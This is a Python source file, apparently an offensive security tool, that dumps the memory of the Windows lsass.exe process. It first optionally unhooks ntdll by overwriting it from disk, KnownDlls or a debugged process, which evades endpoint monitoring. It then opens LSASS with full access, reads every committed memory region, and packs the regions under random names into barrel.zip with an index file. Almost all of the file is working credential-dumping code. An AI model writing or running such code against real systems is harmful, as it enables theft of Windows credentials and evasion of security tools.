import os
import sys
import json
import psutil
import random
import string
import ctypes
import zipfile
import argparse
from ctypes import wintypes
from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc


# Constants
PROCESS_ALL_ACCESS = 0x1F0FFF
MemoryBasicInformation = 0
ProcessBasicInformation = 0 
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x00001000


# Structures
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ("Reserved1", wintypes.LPVOID),
        ("PebBaseAddress", wintypes.LPVOID),
        ("Reserved2", wintypes.LPVOID * 2),
        ("UniqueProcessId", wintypes.HANDLE),
        ("Reserved3", wintypes.LPVOID)
    ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [
        ('BaseAddress', wintypes.LPVOID),
        ('AllocationBase', wintypes.LPVOID),
        ('AllocationProtect', wintypes.DWORD),
        ('RegionSize', ctypes.c_size_t),
        ('State', wintypes.DWORD),
        ('Protect', wintypes.DWORD),
        ('Type', wintypes.DWORD)
    ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [
        ("UniqueProcess", wintypes.HANDLE),
        ("UniqueThread", wintypes.HANDLE)
    ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [
        ("Length", wintypes.ULONG),
        ("RootDirectory", wintypes.HANDLE),
        ("ObjectName", wintypes.LPVOID),
        ("Attributes", wintypes.ULONG),
        ("SecurityDescriptor", wintypes.LPVOID),
        ("SecurityQualityOfService", wintypes.LPVOID)
    ]

def initialize_object_attributes():
    return OBJECT_ATTRIBUTES(
        Length=ctypes.sizeof(OBJECT_ATTRIBUTES),
        RootDirectory=None,
        ObjectName=None,
        Attributes=0,
        SecurityDescriptor=None,
        SecurityQualityOfService=None
    )


# NTAPI functions
ntdll = ctypes.WinDLL("ntdll")
NtQueryInformationProcess = ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = wintypes.LONG
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
NtReadVirtualMemory = ntdll.NtReadVirtualMemory
NtReadVirtualMemory.restype = wintypes.LONG
NtReadVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.LPVOID,    # Buffer
    wintypes.ULONG,     # NumberOfBytesToRead
    wintypes.PULONG     # NumberOfBytesRead
]
NtQueryVirtualMemory = ntdll.NtQueryVirtualMemory
NtQueryVirtualMemory.restype = wintypes.DWORD
NtQueryVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.DWORD,     # MemoryInformationClass
    wintypes.LPVOID,    # MemoryInformation
    wintypes.ULONG,     # MemoryInformationLength
    wintypes.LPVOID     # ReturnLength (optional)
]
NtOpenProcess = ntdll.NtOpenProcess
NtOpenProcess.restype = wintypes.LONG
NtOpenProcess.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.DWORD,     # DesiredAccess
    wintypes.LPVOID,    # ObjectAttributes
    wintypes.LPVOID     # ClientId
]


def get_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choices(characters, k=length))
    return random_string


def get_pid(process_name):
    for proc in psutil.process_iter(['pid', 'name']):
        if proc.info['name'] == process_name:
            return proc.info['pid']


def open_process(pid):
    process_handle = wintypes.HANDLE()
    obj_attributes = initialize_object_attributes()
    client_id = CLIENT_ID(
        UniqueProcess=ctypes.c_void_p(pid),
        UniqueThread=None
    )
    status = NtOpenProcess(
        ctypes.byref(process_handle),
        PROCESS_ALL_ACCESS,
        ctypes.byref(obj_attributes),
        ctypes.byref(client_id)
    )
    if status != 0 or not process_handle:
        print("[-] Could not open handle to the process. Not running as administrator maybe?")
        sys.exit(0)
    return process_handle


def read_remoteintptr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(8)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            8,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return

    read_bytes = buffer.raw[:bytes_read.value][::-1]
    read_int = int(str((read_bytes).hex()),16)
    return read_int 


def read_remoteWStr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(256)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            256,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return ""

    read_bytes = buffer.raw[:bytes_read.value]
    index = read_bytes.find(b'\x00\x00')
    unicode_str = (read_bytes[:index].decode('unicode-escape'))
    unicode_str_clean = "".join(char for char in unicode_str if char.isprintable())
    return unicode_str_clean 


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--option', required=False, action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
    parser.add_argument('-p', '--path', required=False, default="", action='store', help='Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)')
    my_args = parser.parse_args()
    return my_args


def main():
    # Ntdll overwrite
    args = get_args()
    option = args.option
    if option == "disk":
        path = "C:\\Windows\\System32\\ntdll.dll"
        if args.path != "":
            path = args.path
        overwrite_disk(path)
    elif option == "knowndlls":
        overwrite_knowndlls()
    elif option == "debugproc":
        path = "c:\\windows\\system32\\calc.exe"
        if args.path != "":
            path = args.path
        overwrite_debugproc(path)
    else:
        pass

    pid_ = get_pid("lsass.exe")
    if pid_:
        print("[+] PID: \t\t" + str(pid_))
    else:
        print("[-] PID not found")
    process_handle = open_process(pid_)
    print("[+] Process handle: \t" + str(process_handle.value))
    
    # Loop memory regions
    mem_address = 0
    proc_max_address_l = 0x7FFFFFFEFFFF
    mem64list_arr = []
    files_content = []

    while (mem_address < proc_max_address_l):
        memory_info = MEMORY_BASIC_INFORMATION()
        memory_info_size = ctypes.sizeof(memory_info)
        return_length = ctypes.c_size_t()

        status = NtQueryVirtualMemory(
            process_handle,
            mem_address,
            MemoryBasicInformation,
            ctypes.byref(memory_info),
            memory_info_size,
            ctypes.byref(return_length)
        )

        if memory_info.Protect != PAGE_NOACCESS and memory_info.State == MEM_COMMIT:
            buffer = ctypes.create_string_buffer(memory_info.RegionSize)
            bytes_read = wintypes.ULONG(0)
            status = NtReadVirtualMemory(
                process_handle,
                memory_info.BaseAddress,
                buffer,
                memory_info.RegionSize,
                ctypes.byref(bytes_read)
            )

            if status == 0:
                memdump_filename = get_random_string(9) + "." + get_random_string(3)
                #with open(memdump_directory + "\\" + memdump_filename, 'wb') as file:
                #    file.write(buffer.raw)
                files_content.append({"filename": memdump_filename, "content": buffer.raw})
                mem64list_arr.append({"field0": memdump_filename, "field1": hex(mem_address), "field2": memory_info.RegionSize})
    
        mem_address += memory_info.RegionSize

    file_name = "barrel.json"
    zip_name  = "barrel.zip"

    with open(file_name, 'w', encoding='utf-8') as f:
            json.dump(mem64list_arr, f, ensure_ascii=False)
    print("[+] File " + file_name + " generated.")
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for f in files_content:
            zipf.writestr(f['filename'], f['content'])
    print("[+] File " + zip_name + " generated.")


if __name__ == "__main__":
    main()